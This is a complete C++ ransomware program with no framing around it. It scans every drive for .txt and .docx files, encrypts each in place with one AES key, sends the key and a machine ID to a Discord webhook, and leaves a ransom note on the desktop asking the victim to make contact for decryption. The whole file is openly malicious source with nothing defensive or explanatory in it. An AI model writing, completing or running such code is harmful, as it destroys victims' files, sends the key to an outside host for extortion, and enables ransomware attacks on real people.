#include <iostream>
#include <filesystem>
#include <fstream>
#include <random>
#include <string>
#include <vector>
#include <curl/curl.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#ifdef _WIN32
#include <windows.h>
#endif

namespace fs = std::filesystem;

const std::string DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";

// Function to get all drives (Windows and Unix-like systems)
std::vector<std::string> get_all_drives() {
    std::vector<std::string> drives;

#ifdef _WIN32
    DWORD drive_mask = GetLogicalDrives();
    for (int i = 0; i < 26; ++i) {
        if (drive_mask & (1 << i)) {
            drives.push_back(std::string(1, 'A' + i) + ":\\");
        }
    }
#else
    drives.push_back("/");  // Root directory for Linux/macOS
#endif

    return drives;
}

// Function to scan for specific file extensions
std::vector<std::string> scan_files(const std::vector<std::string>& extensions) {
    std::vector<std::string> files;

    std::vector<std::string> drives = get_all_drives();
    for (const auto& drive : drives) {
        for (const auto& entry : fs::recursive_directory_iterator(drive)) {
            if (fs::is_regular_file(entry)) {
                std::string ext = entry.path().extension().string();
                if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                    files.push_back(entry.path().string());
                }
            }
        }
    }
    return files;
}

// Function to generate a random AES key
std::vector<unsigned char> generate_aes_key() {
    std::vector<unsigned char> key(AES_BLOCK_SIZE);  // AES_BLOCK_SIZE is 16 bytes (128 bits)
    RAND_bytes(key.data(), AES_BLOCK_SIZE);
    return key;
}

// Function to encrypt a file with AES
bool encrypt_file(const std::string& file_path, const std::vector<unsigned char>& aes_key) {
    try {
        // Open the file to read its contents
        std::ifstream infile(file_path, std::ios::binary);
        if (!infile.is_open()) {
            std::cerr << "Failed to open file for encryption: " << file_path << std::endl;
            return false;
        }
        std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(infile)), std::istreambuf_iterator<char>());
        infile.close();

        // Initialize encryption
        std::vector<unsigned char> iv(AES_BLOCK_SIZE);  // Initialization vector
        RAND_bytes(iv.data(), AES_BLOCK_SIZE);

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            std::cerr << "Error initializing encryption context" << std::endl;
            return false;
        }

        if (!EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, aes_key.data(), iv.data())) {
            std::cerr << "Error during AES initialization" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        // Encrypt the buffer
        std::vector<unsigned char> encrypted(buffer.size() + AES_BLOCK_SIZE);  // Output buffer for encrypted data
        int len;
        if (!EVP_EncryptUpdate(ctx, encrypted.data(), &len, buffer.data(), buffer.size())) {
            std::cerr << "Error during encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        int encrypted_len = len;

        if (!EVP_EncryptFinal_ex(ctx, encrypted.data() + len, &len)) {
            std::cerr << "Error during final encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        encrypted_len += len;

        EVP_CIPHER_CTX_free(ctx);

        // Write the encrypted data back to the file
        std::ofstream outfile(file_path, std::ios::binary);
        outfile.write((char*)iv.data(), AES_BLOCK_SIZE);  // Write IV at the start of the file
        outfile.write((char*)encrypted.data(), encrypted_len);
        outfile.close();

        return true;
    } catch (const std::exception& ex) {
        std::cerr << "Error encrypting file: " << ex.what() << std::endl;
        return false;
    }
}

// Function to generate a unique machine ID (random 8-character string)
std::string generate_machine_id() {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const size_t length = 8;
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);

    std::string machine_id;
    for (size_t i = 0; i < length; ++i) {
        machine_id += charset[dist(generator)];
    }
    return machine_id;
}

// Function to send AES key and machine ID to Discord via webhook
bool send_key_to_discord(const std::string& machine_id, const std::vector<unsigned char>& aes_key) {
    CURL* curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        std::string json_data = "{\"content\": \"Machine ID: " + machine_id + "\\nAES Key: ";
        for (unsigned char byte : aes_key) {
            json_data += std::to_string(byte);
        }
        json_data += "\"}";

        curl_easy_setopt(curl, CURLOPT_URL, DISCORD_WEBHOOK_URL.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Failed to send data to Discord: " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            return false;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return true;
}

// Function to write a message to the desktop
void write_message_to_desktop(const std::string& message) {
    std::string desktop_path = std::getenv("HOME") ? std::string(std::getenv("HOME")) + "/Desktop" : "";
    if (desktop_path.empty()) {
        std::cerr << "Could not locate desktop path" << std::endl;
        return;
    }

    std::ofstream outfile(desktop_path + "/message.txt");
    if (outfile.is_open()) {
        outfile << message;
        outfile.close();
        std::cout << "Message written to desktop." << std::endl;
    } else {
        std::cerr << "Failed to write message to desktop." << std::endl;
    }
}

int main() {
    // Define the file extensions to scan for
    std::vector<std::string> extensions = { ".txt", ".docx" };

    // Step 1: Scan for files to encrypt in all directories and drives
    std::vector<std::string> files = scan_files(extensions);

    // Step 2: Generate AES key
    std::vector<unsigned char> aes_key = generate_aes_key();

    // Step 3: Encrypt files
    for (const std::string& file_path : files) {
        encrypt_file(file_path, aes_key);
    }

    // Step 4: Generate machine ID
    std::string machine_id = generate_machine_id();

    // Step 5: Send key and machine ID to Discord
    send_key_to_discord(machine_id, aes_key);

    // Step 6: Write a custom message on the desktop
    std::string custom_message = "Your files have been encrypted. Contact us with your machine ID for decryption.";
    write_message_to_desktop(custom_message);

    return 0;
}
